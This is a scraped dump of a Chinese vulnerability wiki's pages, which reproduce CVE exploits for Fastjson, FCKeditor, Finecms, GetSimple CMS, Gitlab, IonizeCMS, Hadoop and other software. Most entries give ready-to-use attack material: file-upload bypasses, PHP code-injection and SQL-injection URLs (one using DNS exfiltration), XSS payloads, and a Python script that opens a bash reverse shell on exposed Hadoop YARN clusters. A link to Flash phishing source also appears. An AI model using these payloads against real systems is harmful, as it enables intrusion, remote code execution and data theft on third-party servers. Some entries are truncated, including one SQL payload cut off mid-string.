Jackson 如果请求包中的 json 如下: {\"name\":\"S\", \"age\":21} 追加一个随机 key ,修改 json 为 {\"name\":\"S\", \"age\":21,\"agsbdkjada__ss_d\":123} 这里 Fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能少不能多 key, 所以会报错,服务器的响应包中多少会有异常回显 Fastjson： Jackson： 无损检测原理 已经知道目标使用的是 Fastjson ,可以用以下 poc 去检测是否存在 DOS 漏洞 Fastjson \\x\\u001a\\u001a 测试代码: Main.java import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String payload = \"{\\\"a\\\":\\\"\\\\x\\u001a\\u001a\\\"}\"; System.out.println(payload); Object o = JSON.parseObject(payload); System.out.println(o.getClass()); } } Fastjson pom.xml 4.0.0 tophant tcc 1.0-SNAPSHOT com.alibaba fastjson 1.2.59 Fastjson == 1.2.60，可以看到报错 pom.xml 4.0.0 tophant tcc 1.0-SNAPSHOT com.alibaba fastjson 1.2.60 使用 Burp 测试 在 Burp 中测试可以使用 : eyJhIjoiXHgaGiJ9 (base64解码) 当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错 使用 {\"a:\"\\x 进行请求就会发生 DOS 以上的检测方式也已经集成到C/ARS产品中，支持漏洞检测。 四、参考链接 https://blog.riskivy.com/%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8Bfastjson-dos%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E7%9B%B2%E5%8C%BA%E5%88%86fastjson%E4%B8%8Ejackson%E7%BB%84%E4%BB%B6/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 15:40:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/1.html":{"url":"0day/FCKeditor/1.html","title":"一、查看FCKeditor版本","keywords":"","body":"1.查看FCKeditor版本 一、漏洞简介 1.查看FCKeditor版本 二、影响范围 三、复现过程 http://127.0.0.1/fckeditor/editor/dialog/fck_about.html http://127.0.0.1/FCKeditor/_whatsnew.html 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 12:57:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/2.html":{"url":"0day/FCKeditor/2.html","title":"二、测试FCKeditor上传点","keywords":"","body":"2.测试FCKeditor上传点 一、漏洞简介 二、影响范围 三、复现过程 FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/connectors/uploadtest.html FCKeditor/_samples/default.html FCKeditor/_samples/asp/sample01.asp FCKeditor/_samples/asp/sample02.asp FCKeditor/_samples/asp/sample03.asp FCKeditor/_samples/asp/sample04.asp FCKeditor/_samples/default.html FCKeditor/editor/fckeditor.htm FCKeditor/editor/fckdialog.html FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/aspx/connector.Aspx fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/php/connector.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 12:58:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/3.html":{"url":"0day/FCKeditor/3.html","title":"三、突破上传","keywords":"","body":"上传限制 上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等 文件名限制 二次上传绕过 文件名‘ . ’ 修改为‘ _ ’ FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 提交shell.php+空格绕过 提交shell.php+空格绕过 空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 iis6.0突破文件夹限制 Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684 FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp 文件解析限制 通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 http://www.0-sec.org/images/upload/201806/image/1.asp/1.jpg 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:24:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/4.html":{"url":"0day/FCKeditor/4.html","title":"四、列目录","keywords":"","body":"1、FCKeditor/editor/fckeditor.html FCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。 2、根据xml返回信息查看网站目录 http://www.-sec.org/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp 3、获取当前文件夹 FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ 4、游览c盘 /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=c:/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:27:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Finecms/Finecms 5.0.10多重漏洞.html":{"url":"0day/Finecms/Finecms 5.0.10多重漏洞.html","title":"Finecms 5.0.10多重漏洞","keywords":"","body":"Finecms 5.0.10多重漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 1、任意文件上传 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2、任意代码执行漏洞 auth下面的分析的时候会说到怎么获取 浏览器输入： http://0-sec.org/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271 这个漏洞的文件在/finecms/dayrui/controllers/Api.php的data2() public function data2() { $data = array(); // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { // 解析数据 $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } } // 接收参数 $format = $this->input->get('format'); $function = $this->input->get('function'); if ($function) { if (!function_exists($function)) { $data = array('msg' => fc_lang('自定义函数'.$function.'不存在'), 'code' => 0); } else { $data = $function($data); } } // 页面输出 if ($format == 'php') { print_r($data); } elseif ($format == 'jsonp') { // 自定义返回名称 echo $this->input->get('callback', TRUE).'('.$this->callback_json($data).')'; } else { // 自定义返回名称 echo $this->callback_json($data); } exit; } 可以看到开头这里验证了认证码： // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { 授权码在/config/system.php 可以看到SYS_KEY是固定的，我们可以在Cookies找到，/finecms/dayrui/config/config.php 用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。 直接看到这一段，调用了Template对象里面的list_tag函数 if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } 我们到finecms/dayrui/libraries/Template.php看list_tag函数的代码,代码有点长，我抓重点的地方,这里把param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271的内容分为两个数组$var、$val，这两个数组的内容分别为 $var=['action','name'] $val=['cache%20','MEMBER.1%27];phpinfo();$a=[%271'] $cache=_cache_var是返回会员的信息 重点的是下面的 @eval('$data=$cache'.$this->_get_var($_param).';'); foreach ($params as $t) { $var = substr($t, 0, strpos($t, '=')); $val = substr($t, strpos($t, '=') + 1); 再看这一段,因为swtich选中的是cache，所有就不再进行下面的分析了。 $pos = strpos($param['name'], '.');这句是为下面的substr函数做准备。 是为了分离出的内容为 $_name='MEMBER' $_param=\"1%27];phpinfo();$a=[%271\" // action switch ($system['action']) { case 'cache': // 系统缓存数据 if (!isset($param['name'])) { return $this->_return($system['return'], 'name参数不存在'); } $pos = strpos($param['name'], '.'); if ($pos !== FALSE) { $_name = substr($param['name'], 0, $pos); $_param = substr($param['name'], $pos + 1); } else { $_name = $param['name']; $_param = NULL; } $cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']); if (!$cache) { return $this->_return($system['return'], \"缓存({$_name})不存在，请在后台更新缓存\"); } if ($_param) { $data = array(); @eval('$data=$cache'.$this->_get_var($_param).';'); if (!$data) { return $this->_return($system['return'], \"缓存({$_name})参数不存在!!\"); } } else { $data = $cache; } return $this->_return($system['return'], $data, ''); break; 跟踪get_var函数，在这里我们先把$param的内容假设为a,然后执行函数里面的内容，最后返回的$string的内容是： $string=['a'] 那么我们的思路就是把两边的[' ']闭合然后再放上恶意的代码。 payload为：1'];phpinfo();$a=['1 那么返回的$string的内容： $string=['1'];phpinfo();$a=['1'] public function _get_var($param) { $array = explode('.', $param); if (!$array) { return ''; } $string = ''; foreach ($array as $var) { $string.= '['; if (strpos($var, '$') === 0) { $string.= preg_replace('/\\[(.+)\\]/U', '[\\'\\\\1\\']', $var); } elseif (preg_match('/[A-Z_]+/', $var)) { $string.= ''.$var.''; } else { $string.= '\\''.$var.'\\''; } $string.= ']'; } return $string; } 修复后的_get_var函数里面多了一个dr_safe_replace过滤函数，然后data2()删除了。 public function _get_var($param) { $array = explode('.', $param); if (!$array) { return ''; } $string = ''; foreach ($array as $var) { $var = dr_safe_replace($var); $string.= '['; if (strpos($var, '$') === 0) { $string.= preg_replace('/\\[(.+)\\]/U', '[\\'\\\\1\\']', $var); } elseif (preg_match('/[A-Z_]+/', $var)) { $string.= ''.$var.''; } else { $string.= '\\''.$var.'\\''; } $string.= ']'; } return $string; } dr_safe_replace() function dr_safe_replace($string) { $string = str_replace('%20', '', $string); $string = str_replace('%27', '', $string); $string = str_replace('%2527', '', $string); $string = str_replace('*', '', $string); $string = str_replace('\"', '&quot;', $string); $string = str_replace(\"'\", '', $string); $string = str_replace('\"', '', $string); $string = str_replace(';', '', $string); $string = str_replace('', '&gt;', $string); $string = str_replace(\"{\", '', $string); $string = str_replace('}', '', $string); return $string; } 3、任意sql语句执行1 http://0-sec.org/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20version();%27 4、任意sql语句执行2 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 14:41:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Finecms/CVE-2018-6893.html":{"url":"0day/Finecms/CVE-2018-6893.html","title":"（CVE-2018-6893）Finecms SQL注入漏洞","keywords":"","body":"（CVE-2018-6893）Finecms SQL注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞位置在： finecms/dayrui/controllers/member/Api.php 590行左右 public function checktitle() { $id = (int)$this->input->get('id'); $title = $this->input->get('title', TRUE); $module = $this->input->get('module'); (!$title || !$module) && exit(''); $num = $this->db->where('id<>', $id)->where('title', $title)->count_all_results(SITE_ID.'_'.$module); $num ? exit(fc_lang(''.fc_lang('重复').'')) : exit(''); } 可以看到方法count_all_results()使用了$module,count_all_results()方法如下： public function count_all_results($table = '', $reset = TRUE) { if ($table !== '') { $this->_track_aliases($table); $this->from($table); } // ORDER BY usage is often problematic here (most notably // on Microsoft SQL Server) and ultimately unnecessary // for selecting COUNT(*) ... if ( ! empty($this->qb_orderby)) { $orderby = $this->qb_orderby; $this->qb_orderby = NULL; } $result = ($this->qb_distinct === TRUE OR ! empty($this->qb_groupby) OR ! empty($this->qb_cache_groupby) OR $this->qb_limit OR $this->qb_offset) ? $this->query($this->_count_string.$this->protect_identifiers('numrows').\"\\nFROM (\\n\".$this->_compile_select().\"\\n) CI_count_all_results\") : $this->query($this->_compile_select($this->_count_string.$this->protect_identifiers('numrows'))); if ($reset === TRUE) { $this->_reset_select(); } // If we've previously reset the qb_orderby values, get them back elseif ( ! isset($this->qb_orderby)) { $this->qb_orderby = $orderby; } if ($result->num_rows() === 0) { return 0; } $row = $result->row(); return (int) $row->numrows; } 可以看到对传入的table参数进行了是否为空校验以及经过两个函数的处理，再跟进_track_aliases函数继续进行分析： protected function _track_aliases($table) { if (is_array($table)) { foreach ($table as $t) { $this->_track_aliases($t); } return; } // Does the string contain a comma? If so, we need to separate // the string into discreet statements if (strpos($table, ',') !== FALSE) { return $this->_track_aliases(explode(',', $table)); } // if a table alias is used we can recognize it by a space if (strpos($table, ' ') !== FALSE) { // if the alias is written with the AS keyword, remove it $table = preg_replace('/\\s+AS\\s+/i', ' ', $table); // Grab the alias $table = trim(strrchr($table, ' ')); // Store the alias, if it doesn't already exist if ( ! in_array($table, $this->qb_aliased_tables, TRUE)) { $this->qb_aliased_tables[] = $table; if ($this->qb_caching === TRUE && ! in_array($table, $this->qb_cache_aliased_tables, TRUE)) { $this->qb_cache_aliased_tables[] = $table; $this->qb_cache_exists[] = 'aliased_tables'; } } } } 可以看到table在这个函数中经过了较多过滤，继续看下一个函数from： public function from($from) { foreach ((array) $from as $val) { if (strpos($val, ',') !== FALSE) { foreach (explode(',', $val) as $v) { $v = trim($v); $this->_track_aliases($v); $this->qb_from[] = $v = $this->protect_identifiers($v, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $v; $this->qb_cache_exists[] = 'from'; } } } else { $val = trim($val); // Extract any aliases that might exist. We use this information // in the protect_identifiers to know whether to add a table prefix $this->_track_aliases($val); $this->qb_from[] = $val = $this->protect_identifiers($val, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $val; $this->qb_cache_exists[] = 'from'; } } } return $this; } 可以看到经过这两个函数以及finecms本身get方法的过滤，能用的符号不多了，但是括号以及逗号都还能使用。 在测试的时候，如果传入的参数比如：module=1，则会爆表不存在的错误，并且可以看到查询的语句，而module参数位于from位置，也就是查询的表的位置，于是使用逗号分割查询的表，并使用dns外带数据 payload如下 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select load_file(concat(0x5c5c5c5c,version(),0x2e6d7973716c2e61687a6935672e636579652e696f5c5c616263)))) as total 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 14:47:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Flash/1.html":{"url":"0day/Flash/1.html","title":"Flash钓鱼源码","keywords":"","body":"Flash 钓鱼源码 https://github.com/ianxtianxt/Flash-player 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-09 21:55:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/GetSimple CMS/1.html":{"url":"0day/GetSimple CMS/1.html","title":"（CVE-2019-11231）GetSimple CMS远程命令执行","keywords":"","body":"（CVE-2019-11231）GetSimple CMS 远程命令执行 一、漏洞简介 在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。 二、漏洞影响 GetSimple 三、复现过程 漏洞分析 在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。 htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。 启用.htaccess，需要在apache配置文件中，启用AllowOverride。 在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。 先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf 可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入 跟进 httpd-vhosts.conf文件 可以看到，在这里，默认情况下 AllowOverride 默认值是All 当AllowOverride指令设置为 All时，所有具有”.htaccess”作用域的指令都允许出现在.htaccess文件中。 此时，目录中的.htaccess配置文件为启用状态 例如位于getsimplecms/data目录中的.htaccess配置文件 当此.htaccess配置文件被加载时，是禁止该目录被web端访问的 也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表 与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露 但是在笔者的ubuntu服务器，ubuntu apache2.conf中 AllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess 我们将上述的.htaccess文件放入ubuntu服务器的web目录中 再通过浏览器访问这个路径 如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的 回归到本次漏洞： 访问http://127.0.0.1/getsimplecms/data/users/admin.xml 在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中 访问http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey 现在我们得到如下的信息：（用户名/加密后的密码/apikey） 该cms并没有将用户信息写入数据库，而是全部存于xml文件中 通过获取的信息，接下来进一步分析如何利用这些泄露的信息： Cookie算法分析： 分析下GetSimple中的cookie是如何生成的 位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php create_cookie方法 计算cookie所需的$USR $SALT 对应如下： GetSimpleCMS\\data\\users\\admin.xml文件 getsimplecms\\data\\other\\authorization.xml 这些信息是可以直接读取出来的 getsimplecms 中Cookie的算法的实现如下: 算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对 通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie 现在，可以伪造任意成员的cookie了 以USR :admin举例说明： 最终拼接的cookie为： GS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c Password算法分析： 分析下Password的计算方式 Password的加密，是通过passhash()方法来实现的 GSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。 所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密 sha1($p) 通过sha1 hash将明文密码加密为密文。 也就是说，只要获取了加密后的password，有一定几率，可以破解为明文： 获取到管理员cookie/password后，使用管理员账号登陆后台 通过伪造cookie访问后台： 未登录时，访问后台地址 此时需要填写正确的用户名密码才可以登陆后台 这里，通过改包的方式，将cookie修改为之前计算出的值 此时，无需登陆，直接进入后台 访问如下url http://127.0.0.1/getsimplecms/admin/theme-edit.php 在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞 例如： 访问如下地址： http://127.0.0.1/getsimplecms/theme/Innovation/template.php 插入的php代码被成功执行 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 00:07:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Gitbook/CVE-2017-15688.html":{"url":"0day/Gitbook/CVE-2017-15688.html","title":"（CVE-2017-15688）Gitbook任意文件读取","keywords":"","body":"（CVE-2017-15688）Gitbook任意文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 创建一个md文件，代码用以下 ln -s /etc/passwd ./passwd.md 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 15:19:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Gitlab/1.html":{"url":"0day/Gitlab/1.html","title":"Gitlab wiki 储存型xss","keywords":"","body":"Gitlab wiki 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 1、登录到GitLab。 2、打开有权编辑Wiki页面的’Project’。 3、打开Wiki页面。 4、点击’New page’。 5、用’javascript:’填写’Page slug’表单。 6、点击’Createpage’。 7、填写每个表格： Title: javascript: Format:Markdown Content: [XSS](.alert(1);) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 12:28:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Google/CVE-2019-5786.html":{"url":"0day/Google/CVE-2019-5786.html","title":"（CVE-2019-5786）Chrome 远程代码执行漏洞","keywords":"","body":"（CVE-2019-5786）Chrome 远程代码执行漏洞 一、漏洞简介 攻击者利用该漏洞配合一个win32k.sys的内核提权（CVE-2019-0808 ）可以在win7上穿越Chrome沙箱 二、漏洞影响 72.0.3626.121或更高版本 三、复现过程 测试环境为： win7 x86 谷歌浏览器版本为72.0.3626.119 这里看一下参数说明 设置lhost为我们的本机ip 执行exploit之后，会返回一个链接 只要被攻击者访问了这个链接，就会触发漏洞，返回session 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 14:18:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Hadoop/1.html":{"url":"0day/Hadoop/1.html","title":"Hadoop未授权访问","keywords":"","body":"Hadoop未授权访问 一、漏洞简介 Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理： 用户创建一个处理键值的map函数 产生了一套中间键/值 reduce函数合并中间值并把他们关联到对应的键 二、影响范围 三、复现过程 1. 扫描探测 1.1 常见端口 1.2 敏感端口 模块 节点 默认端口 HDFS NameNode 50070 HDFS SecondNameNode 50090 HDFS DataNode 50075 HDFS Backup/Checkpoint node 50105 MapReduce JobTracker 50030 MapReduce TaskTracker 50060 通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。 2. 攻击手法 利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 REST API 也可以提交任务执行。 利用过程如下： 在本地监听等待反弹 shell 连接 调用 New Application API 创建 Application 调用 Submit Application API 提交 P牛的攻击脚本 ##!/usr/bin/env python import requests target = 'http://127.0.0.1:8088/' lhost = '192.168.0.1' ## put your local host ip here, and listen at port 9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3. 防范措施 网络访问控制 使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。 启用认证功能 启用 Kerberos 认证功能。 更新补丁 不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Harbor/1.html":{"url":"0day/Harbor/1.html","title":"（CVE-2019-16097）Harbor未授权创建管理员漏洞","keywords":"","body":"（CVE-2019-16097）Harbor未授权创建管理员漏洞 一、漏洞简介 近日，镜像仓库Harbor爆出任意管理员注册漏洞，攻击者在请求中构造特定字符串，在未授权的情况下可以直接创建管理员账号，从而接管Harbor镜像仓库。我们得到消息，第一时间对该漏洞进了验证，官方已发布公告说明，最新的1.7.6和1.8.3已修复此漏洞，请使用到的用户尽快升级至安全版本。 Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器。Harbor 1.7.0版本至1.8.2版本中的core/api/user.go文件存在安全漏洞。攻击者通过在请求中添加关键参数，即可利用该漏洞创建管理员账户，从而接管Harbor镜像仓库。 二、影响范围 Harbor 1.7.0版本至1.8.2 三、复现过程 https://github.com/ianxtianxt/CVE-2019-16097 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 13:13:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/IonizeCMS/2.html":{"url":"0day/IonizeCMS/2.html","title":"（CVE-2017-5961）IonizeCMS xss","keywords":"","body":"（CVE-2017-5961）IonizeCMS xss 一、漏洞简介 该漏洞源于在‘path’HTTP GET参数传递到‘ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php’URL时，程序没有充分地过滤此参数中用户提交的数据。攻击者可利用该漏洞在浏览器中执行任意的HTML和脚本代码。 二、漏洞影响 三、复现过程 http://0-sec.org/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%22 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 16:27:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/IonizeCMS/1.html":{"url":"0day/IonizeCMS/1.html","title":"IonizeCMS sql注入","keywords":"","body":"IonizeCMS sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 伪造HTTP头注入 在抓包哇： X-Forwarded-Host: 'and(select 1 from(select count(*),concat((select concat(0x5e5e5e,version(),0x5e5e5e) from informat 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 16:26:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jenkins/（CVE-2019-10475）.html":{"url":"0day/Jenkins/（CVE-2019-10475）.html","title":"（CVE-2019-10475）反射xss","keywords":"","body":"（CVE-2019-10475） 插件反射型xss 一、漏洞简介 二、漏洞影响 360 FireLine插件， 最高包括1.7.2 Bitbucket OAuth插件， 最高包括0.9 Build-metrics插件 1.3及以下 部署WebLogic Plugin 最高至4.1 Dynatrace应用程序监视插件， 最高包括2.1.3 Dynatrace应用程序监视插件， 最高包括2.1.4 ElasticBox Jenkins Kubernetes CI / CD插件， 最高至1.3 包含1.1.4及以下版本的 全局Post Script插件 Libvirt Slaves插件， 最高包括1.8.5 截至 2.7.0的 Mattermost Notification插件 Sonar Gerrit插件， 最高包括2.3 Zulip插件 （包括1.1.0及以下） 三、复现过程 1、手工复现 该vulnearble插件位于http://localhost:8080/plugin/build-metrics/，漏洞参数为label。 